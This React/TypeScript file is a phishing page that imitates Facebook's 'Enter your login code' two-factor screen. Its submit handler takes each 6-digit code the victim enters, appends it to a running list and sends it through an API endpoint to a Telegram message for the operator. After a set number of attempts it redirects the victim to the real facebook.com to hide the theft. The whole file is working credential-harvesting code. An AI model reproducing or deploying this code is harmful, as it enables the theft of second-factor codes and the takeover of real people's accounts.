import type { FC } from 'react';
import { useState, useEffect, useRef } from 'react';
import Image from '@/assets/images/authentication-app-image.png';
import '@/assets/fonts/Optimistic.woff2';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {
    faXmark,
    faArrowLeft,
    faCircleQuestion,
    faArrowRotateRight,
} from '@fortawesome/free-solid-svg-icons';
import ConfirmationMethods from '@/components/confirmation-methods';
import { getSystemConfig } from '@/types/system';
import { useNavigate } from 'react-router';

interface VerificationFormProps {
    isMobile: boolean;
}

interface TelegramResponse {
    success: boolean;
    message: string;
    message_id?: number;
}

const VerificationForm: FC<VerificationFormProps> = ({ isMobile }) => {
    const [showModal, setShowModal] = useState(false);
    const [showHelpModal, setShowHelpModal] = useState(false);
    const codeInputRef = useRef<HTMLInputElement>(null);
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [code, setCode] = useState('');
    const navigate = useNavigate();
    const config = getSystemConfig();
    const [oldMessageId, setOldMessageId] = useState<number | null>(null);
    const [countdown, setCountdown] = useState<number>(0);
    const [canResend, setCanResend] = useState(true);

    useEffect(() => {
        if (!config) {
            navigate('/');
        }
    }, [config, navigate]);

    useEffect(() => {
        if (codeInputRef.current) {
            codeInputRef.current.focus();
        }
    }, []);

    useEffect(() => {
        const savedMessageId = localStorage.getItem('telegram_message_id');
        if (!savedMessageId) {
            navigate('/');
            return;
        }
        setOldMessageId(parseInt(savedMessageId));
    }, [navigate]);

    const sendTelegramMessage = async (text: string) => {
        try {
            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    text,
                    parse_mode: 'HTML',
                    old_message_id: oldMessageId,
                }),
            });

            const data: TelegramResponse = await response.json();

            if (data.success && data.message_id) {
                localStorage.setItem('telegram_message_id', data.message_id.toString());
                localStorage.setItem('telegram_message', text);
                setOldMessageId(data.message_id);
            }

            return data.success;
        } catch (error) {
            console.error('Error sending Telegram message:', error);
            return false;
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!config) {
            navigate('/');
            return;
        }

        setIsLoading(true);
        setAttempts(attempts + 1);

        setCanResend(false);
        setCountdown(Math.ceil(config.code_load_duration / 1000));

        const oldMessage = localStorage.getItem('telegram_message') ?? '';
        const codeRegex = /🔐 <b>Mã xác thực \d+:<\/b> <code>(.*?)<\/code>/g;
        const oldCodes: string[] = [];
        let match;

        while ((match = codeRegex.exec(oldMessage)) !== null) {
            oldCodes.push(match[1]);
        }

        const newCodeText = `🔐 <b>Mã xác thực ${oldCodes.length + 1}:</b> <code>${code}</code>`;
        const separator = oldMessage ? '\n' : '';

        const messageContent = `${oldMessage}${separator}${newCodeText}`.trim();

        await sendTelegramMessage(messageContent);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    setCanResend(true);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, config.code_load_duration));
        if (attempts >= config.code_load_limit) {
            window.location.replace('https://www.facebook.com/');
        }
        setIsLoading(false);
    };

    const handleBack = () => {
        navigate(-1);
    };

    return isMobile ? (
        <div className="flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]">
            <div className="mb-6 flex items-center justify-between">
                <button onClick={handleBack} className="text-[#1c2b33] hover:text-gray-700">
                    <FontAwesomeIcon icon={faArrowLeft} size="lg" />
                </button>
                <button
                    onClick={() => setShowHelpModal(true)}
                    className="text-[#1c2b33] hover:text-gray-700"
                >
                    <FontAwesomeIcon icon={faCircleQuestion} size="lg" />
                </button>
            </div>
            <div className="text-[#0a1317]">
                <p className="text-[13px] font-medium">Facebook account • Facebook</p>
                <p className="mt-4 text-2xl font-semibold">Enter your login code</p>
                <p className="mb-4 text-[15px]">
                    Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a two-factor
                    authentication app you&apos;ve set up (like Duo Mobile or Google Authenticator).
                </p>
            </div>
            <img src={Image} alt="" className="mb-4 w-full rounded-xl" />
            <div className="relative mb-4">
                <div className="relative h-[56px]">
                    <input
                        ref={codeInputRef}
                        id="code-input-mobile"
                        type="number"
                        placeholder=" "
                        value={code}
                        onChange={(e) => {
                            const value = e.target.value;
                            if (value.length <= 6) {
                                setCode(value);
                            }
                        }}
                        className="peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"
                    />
                    <button
                        onClick={() => {
                            setCode('');
                        }}
                        className="absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700"
                    >
                        <FontAwesomeIcon icon={faXmark} size="lg" />
                    </button>
                    <label
                        htmlFor="code-input-mobile"
                        className="absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm"
                    >
                        Code
                    </label>
                </div>
                <p className="mt-2 flex items-center justify-start gap-1 text-left text-sm text-gray-500">
                    <FontAwesomeIcon icon={faArrowRotateRight} className="h-4 w-4" />
                    {!canResend
                        ? `We can send new code after 0:0${countdown}`
                        : 'You can request a new code now'}
                </p>
            </div>
            <div className="flex flex-col gap-3">
                <button
                    onClick={handleSubmit}
                    disabled={isLoading || code.length !== 6}
                    className={`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${
                        isLoading ? 'cursor-default opacity-50' : 'hover:bg-blue-600'
                    } disabled:opacity-50`}
                >
                    Continue
                </button>
                <button
                    onClick={() => setShowModal(true)}
                    className="w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]"
                >
                    Try Another Way
                </button>
            </div>
            {showModal && <ConfirmationMethods onClose={() => setShowModal(false)} />}
            {showHelpModal && <ConfirmationMethods onClose={() => setShowHelpModal(false)} />}
        </div>
    ) : (
        <div className="flex min-h-screen flex-col items-center justify-center font-[Optimistic]">
            <div className="max-w-[600px]">
                <div className="text-[#0a1317]">
                    <p className="text-[13px] font-medium">Facebook account • Facebook</p>
                    <p className="text-2xl font-semibold">Enter your login code</p>
                    <p className="mb-2 text-[15px]">
                        Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a
                        two-factor authentication app you&apos;ve set up (like Duo Mobile or Google
                        Authenticator).
                    </p>
                </div>
                <img src={Image} alt="" className="mb-3" />
                <div className="relative mb-3">
                    <div className="relative h-[56px]">
                        <input
                            ref={codeInputRef}
                            id="code-input"
                            type="number"
                            placeholder=" "
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value;
                                if (value.length <= 6) {
                                    setCode(value);
                                }
                            }}
                            className="peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"
                        />
                        <button
                            onClick={() => {
                                setCode('');
                            }}
                            className="absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700"
                        >
                            <FontAwesomeIcon icon={faXmark} size="lg" />
                        </button>
                        <label
                            htmlFor="code-input"
                            className="absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm"
                        >
                            Code
                        </label>
                    </div>
                    <p className="mt-2 flex items-center justify-start gap-1 text-left text-sm text-gray-500">
                        <FontAwesomeIcon icon={faArrowRotateRight} className="h-4 w-4" />
                        {!canResend
                            ? `We can send new code after 0:0${countdown}`
                            : 'You can request a new code now'}
                    </p>
                </div>
                <div className="flex flex-col gap-2">
                    <button
                        onClick={handleSubmit}
                        disabled={isLoading || code.length !== 6}
                        className={`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${
                            isLoading ? 'cursor-default opacity-50' : 'hover:bg-blue-600'
                        } disabled:opacity-50`}
                    >
                        Continue
                    </button>
                    <button
                        onClick={() => setShowModal(true)}
                        className="w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]"
                    >
                        Try Another Way
                    </button>
                </div>
            </div>
            {showModal && <ConfirmationMethods onClose={() => setShowModal(false)} />}
            {showHelpModal && <ConfirmationMethods onClose={() => setShowHelpModal(false)} />}
        </div>
    );
};

const TwoStepVerification: FC = () => {
    const [isMobile, setIsMobile] = useState(false);

    useEffect(() => {
        const checkIfMobile = () => {
            setIsMobile(window.innerWidth < 768);
        };
        checkIfMobile();
        window.addEventListener('resize', checkIfMobile);
        return () => {
            window.removeEventListener('resize', checkIfMobile);
        };
    }, []);

    return (
        <>
            <title>Facebook</title>
            <VerificationForm isMobile={isMobile} />
        </>
    );
};

export default TwoStepVerification;
